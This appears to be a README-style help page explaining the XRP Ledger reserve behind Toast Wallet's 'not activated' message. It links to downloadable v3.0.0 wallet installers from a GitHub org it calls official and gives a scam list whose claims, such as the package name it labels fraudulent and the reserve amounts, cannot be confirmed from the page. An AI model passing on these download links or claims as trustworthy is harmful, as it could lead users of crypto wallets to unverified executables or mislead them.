<div align="center">

# Why Does Toast Wallet Say "Not Activated"? The 20 XRP Reserve, Explained

**Why Toast Wallet shows "not activated," and why it's not a bug.**

![Docs](https://img.shields.io/badge/DOCS-toast--wallet--docs-555555?style=for-the-badge) [![GitHub Org](https://img.shields.io/badge/GITHUB-Toast--Wallet-6f42c1?style=for-the-badge)](https://github.com/Toast-Wallet) ![License](https://img.shields.io/badge/LICENSE-GPL--2.0-97ca00?style=for-the-badge) ![Release](https://img.shields.io/badge/RELEASE-v3.0.0-0078D6?style=for-the-badge)

</div>

---

## 📥 Downloads — v3.0.0

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-WINDOWS-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) [![Download for macOS](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-MACOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) [![Download for Linux](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-LINUX-E95420?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage)

</div>

| Platform | Requirements | File | Checksum |
|---|---|---|---|
| 🪟 Windows | Windows desktop (64-bit) | [ToastWallet.Setup.3.0.0.exe](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-windows.sha256) |
| 🍎 macOS | macOS desktop | [ToastWallet-3.0.0.dmg](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-macos.sha256) |
| 🐧 Linux | Most modern 64-bit distributions, no install needed | [ToastWallet-3.0.0-x86_64.AppImage](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-linux.sha256) |

Verify your download against the matching SHA256 file before running any installer — all files
and checksums are also listed together on the
[**official v3.0.0 release page**](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> ⚠️ **Only download from this GitHub release page or the [official Toast-Wallet GitHub org](https://github.com/Toast-Wallet).**
> toastwallet.com is currently unreachable, and `toastwallet.app` is a known phishing clone —
> see our [full scam warning list](./toast-wallet-scam-warning-list.md).

---

Seeing "account not activated" or a similar error, even though you can see a balance, is one of
the most common sources of panic for former Toast Wallet users — and in the large majority of
cases, it has nothing to do with theft or a bug.

**The short explanation:** the XRP Ledger requires every address to hold a minimum amount of XRP,
called the **reserve**, before it's considered "activated" and able to send or receive
transactions freely. This isn't a Toast Wallet rule — it's a rule of the underlying XRP Ledger
itself, designed to prevent spam addresses from clogging the network. Historically this reserve
was 20 XRP; the network has since voted to lower it, and it currently sits at 10 XRP for new
addresses (the exact figure can change via network governance, so always check the current
requirement before assuming a fixed number).

**What this means practically:**
- If your wallet shows XRP but transactions fail, check whether your balance is at or below the
  reserve amount — you may need to send a small amount of *additional* XRP into the address before
  it can transact at all.
- That reserve amount is **not spendable**. It's set aside for as long as the address exists. This
  is why several long-time Toast Wallet users have reported being unable to fully empty an old
  wallet — the last 10-20 XRP is functioning exactly as designed, not stuck due to an error.
- An address showing "not activated" with a balance below the reserve threshold, and no
  transaction history you don't recognize, is normal — it was likely never fully funded past the
  minimum, or was drawn down close to it in a previous transaction.

**How to tell the difference between "just needs activation" and "actually compromised":** check
your full transaction history on a public ledger explorer like bithomp.com or xrpscan.com, not
just the balance shown in the app. If there's an unexplained large outgoing transaction you don't
recognize, that's a sign of compromise — see our [scam warning list]
(./toast-wallet-scam-warning-list.md). If the history is exactly as you remember it and the
remaining balance simply matches the reserve amount, nothing is wrong — the funds are safe and
accounted for; they're just structurally unspendable by design.

For getting the rest of your balance out once your address is properly activated, see our
[guide to moving XRP out of Toast Wallet](./how-to-move-xrp-out-of-toast-wallet.md).

---

## ⚠️ Known Scams — Do Not Use These

- **The "Toast Plus" fraudulent app** (App Store / Google Play, package `co.peninsulasoftware.toastwallet`) — a lookalike app, not affiliated with Toast Wallet, that has stolen an estimated **$5M+ in XRP**. Full details: [The Toast Plus App Scam](./toast-plus-app-scam.md).
- **The toastwallet.app phishing site** — a clone of the official recovery page that drains any wallet imported into it. Full details: [Toast Wallet Phishing Sites](./toast-wallet-phishing-sites.md).
- **Marketing clone sites** — `xrp-toastwallet.com`, `toast-wallet.com`, `en-toastwallet.com`, `toast-wallet.net`. Not official, and misrepresent how Toast Wallet actually works.
- **Paid "recovery service" DMs** — always a follow-up scam; no one can reverse an XRP Ledger transaction.

See the [full Toast Wallet scam warning list](./toast-wallet-scam-warning-list.md). If you believe you've been scammed, file a report at [ic3.gov](https://www.ic3.gov).

## Related Articles

- [How to Move XRP Out of Toast Wallet](./how-to-move-xrp-out-of-toast-wallet.md)
- [Toast Wallet Scam Warning List](./toast-wallet-scam-warning-list.md)
- [How to Recover XRP From an Old Toast Wallet](./how-to-recover-xrp-toast-wallet.md)
